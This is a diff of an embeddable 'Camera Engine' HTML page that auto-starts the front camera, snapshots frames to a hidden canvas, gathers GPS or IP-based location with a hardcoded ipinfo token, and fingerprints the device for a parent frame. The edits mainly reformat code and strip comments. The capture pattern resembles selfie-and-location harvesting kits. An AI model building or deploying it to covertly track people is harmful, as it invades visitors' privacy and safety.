@@ -3,39 +3,24 @@
 <head>
     <title>Camera Engine</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: #000;
-        }
-        video {
-            width: 100%;
-            max-width: 400px;
-            border-radius: 10px;
-            transform: scaleX(-1); /* Mirror selfie mode */
-        }
-        canvas { display: none; }
+        body { margin:0; padding:0; height:100vh; display:flex; justify-content:center; align-items:center; background:#000; }
+        video { width:100%; max-width:400px; border-radius:10px; transform:scaleX(-1); }
+        canvas { display:none; }
     </style>
 </head>
 <body>
     <video id="video" autoplay muted playsinline></video>
     <canvas id="canvas"></canvas>
-
     <script>
-        // ================== CAMERA ==================
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
 
         async function initCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 640 } },
-                    audio: false
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 640 } }, 
+                    audio: false 
                 });
                 video.srcObject = stream;
                 await video.play();
@@ -48,7 +33,6 @@
             }
         }
 
-        // ================== LOCATION (GPS + IP Fallback) ==================
         function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -56,11 +40,7 @@
                     return;
                 }
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve({
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        source: 'GPS (High Accuracy)'
-                    }),
+                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, source: 'GPS' }),
                     () => fallbackToIP(resolve),
                     { enableHighAccuracy: true, timeout: 8000 }
                 );
@@ -71,17 +51,12 @@
             fetch('https://ipinfo.io/json?token=a0cf54b7e5e91b')
                 .then(r => r.json())
                 .then(d => {
-                    const loc = d.loc ? d.loc.split(',') : [0, 0];
-                    resolve({
-                        lat: parseFloat(loc[0]) || 0,
-                        lon: parseFloat(loc[1]) || 0,
-                        source: 'IP Fallback (Approx)'
-                    });
+                    const loc = d.loc ? d.loc.split(',') : [0,0];
+                    resolve({ lat: parseFloat(loc[0]) || 0, lon: parseFloat(loc[1]) || 0, source: 'IP Fallback' });
                 })
                 .catch(() => resolve({ lat: 0, lon: 0, source: 'Location Failed' }));
         }
 
-        // ================== DEVICE DETECTION ==================
         function getDevice() {
             const ua = navigator.userAgent;
             if (ua.includes('iPhone')) return 'iPhone';
@@ -92,14 +67,13 @@
             return 'Unknown';
         }
 
-        // ================== EXPOSED CAPTURE FUNCTION ==================
         window.captureData = async function() {
-            // Update canvas size to match current video
+            // Update canvas size if video dimensions changed
             if (video.videoWidth) {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
             }
-            // Draw the mirrored video (so the selfie looks natural)
+            // Draw mirrored selfie
             ctx.save();
             ctx.scale(-1, 1);
             ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
@@ -118,11 +92,9 @@
             };
         };
 
-        // Auto-start on load
+        // Auto-start and notify parent
         initCamera().then(ok => {
-            window.parent.postMessage({
-                type: ok ? 'cameraReady' : 'cameraError'
-            }, '*');
+            window.parent.postMessage({ type: ok ? 'cameraReady' : 'cameraError' }, '*');
         });
     </script>
 </body>
